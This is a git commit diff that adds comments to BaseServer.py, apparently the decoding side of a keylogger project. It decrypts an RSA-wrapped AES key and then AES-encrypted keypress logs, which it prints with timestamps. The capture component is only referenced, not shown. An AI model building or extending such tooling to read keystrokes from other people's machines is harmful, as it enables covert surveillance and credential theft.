e09f15a66cd37e8dc1273c68f4a2cad91974fc3f
Harsh Varagiya <32223129+HarshVaragiya@users.noreply.github.com>
2018-06-11 00:17:56 +0530

    Update BaseServer.py

--- BaseServer.py
+++ BaseServer.py
@@ -1,55 +1,55 @@
 #/usr/bin/python3
-import pyaes
-import sys
-from Crypto.PublicKey import RSA
+import pyaes                                                       # To decrypt AES 
+import sys                           
+from Crypto.PublicKey import RSA                                   # To decrypt Encrypted AES Key 
 
-fw = open('private_key.pem','r')
-private_key = fw.read()
-fw.close()
+fw = open('private_key.pem','r')                                   # Read RSA Private Key from file 
+private_key = fw.read()                                            # Private Key can be provided in Source
+fw.close()                                                         # Code too like WatchDog.py
 
 class Base:
     def __init__(self,RSA_PRIVATE_KEY,LOG_FILE_NAME='LogFile.bin',KEY_FILE_NAME='AESKey.bin'):
-        self.RSA_PRIVATE_KEY = RSA_PRIVATE_KEY
-        self.LOG_FILE_NAME = LOG_FILE_NAME
-        self.KEY_FILE_NAME = KEY_FILE_NAME
+        self.RSA_PRIVATE_KEY = RSA_PRIVATE_KEY                     
+        self.LOG_FILE_NAME = LOG_FILE_NAME                         # logfile name to read from
+        self.KEY_FILE_NAME = KEY_FILE_NAME                         # AES Key file name 
         
-        self.init_RSA_Object()
-        self.get_AES_Key()
-        self.aes = self.generate_AES_Object()
+        self.init_RSA_Object()                                     # initialize a RSA object that can decrypt
+        self.get_AES_Key()                                         # Get AES Key by decrypting AES_KEY file using RSA
+        self.aes = self.generate_AES_Object()                      # generate AES object that can decrypt using the AES key
 
     def init_RSA_Object(self):
-        self.RSA_Obj = RSA.importKey(self.RSA_PRIVATE_KEY)
+        self.RSA_Obj = RSA.importKey(self.RSA_PRIVATE_KEY)         # RSA Object
     
-    def get_AES_Key(self):
+    def get_AES_Key(self):                                         # get Encrypted AES Key, Decrypt using RSA Private Key
         fw = open(self.KEY_FILE_NAME,'rb')
         enc_data = fw.read()
         self.RSA_Decrypt(enc_data)
         fw.close()
     
-    def RSA_Decrypt(self,encrypted_data):
-        try:
+    def RSA_Decrypt(self,encrypted_data):                         # Decrypt Encrypted AES Key if Public and Private Key pair
+        try:                                                      # Are correct. Else Key is Mismatched
             self.AES_KEY = self.RSA_Obj.decrypt(encrypted_data)
         except:
             print("RSA Key Mismatch!")
             exit()
 
-    def generate_AES_Object(self):
-        aes = pyaes.AESModeOfOperationCTR(self.AES_KEY)
+    def generate_AES_Object(self):                                 # generate AES Onject from AES key
+        aes = pyaes.AESModeOfOperationCTR(self.AES_KEY)            # AES Object can decrypt AES Encrypted logs
         return aes
 
-    def load_logs(self):
+    def load_logs(self):                                          # load logs into a list of plaintext data
         try:  
             fw = open(self.LOG_FILE_NAME,'rb')
             ciphertext = fw.read()
             fw.close()
-            decrypted = self.aes.decrypt(ciphertext)
-            self.log = str(decrypted.decode()).split('\n')
+            decrypted = self.aes.decrypt(ciphertext)              # decrypt using AES Key
+            self.log = str(decrypted.decode()).split('\n')        # log-data into list conversion
         except:
             print("Exception Occoured!")
-            print(sys.exc_info()[0])
+            print(sys.exc_info()[0])                              # print exception
 
-    def pretty_print_logs(self):
-        start_len = len("YYYY-MM-DD HH:MM:SS.MS-")
+    def pretty_print_logs(self):                                  # Print just the important Textual Data
+        start_len = len("YYYY-MM-DD HH:MM:SS.MS-")                
         text_log = ""
         for event in self.log:
             data = event[start_len:]
@@ -65,7 +65,11 @@ class Base:
                     data = " " + data + " "
             text_log += data
         print(text_log)
+        
+    def print_all_logs(self):                          # Print all Logs Serially with date and time 
+        for log_event in self.log:                     # of keypress. 
+            print(log_event)
 
-Y = Base(private_key)
-Y.load_logs()
-Y.pretty_print_logs()
+Y = Base(private_key)                                  # Initialize the class with Private Key 
+Y.load_logs()                                          # load into memory
+Y.pretty_print_logs()                                  # pretty print the logs
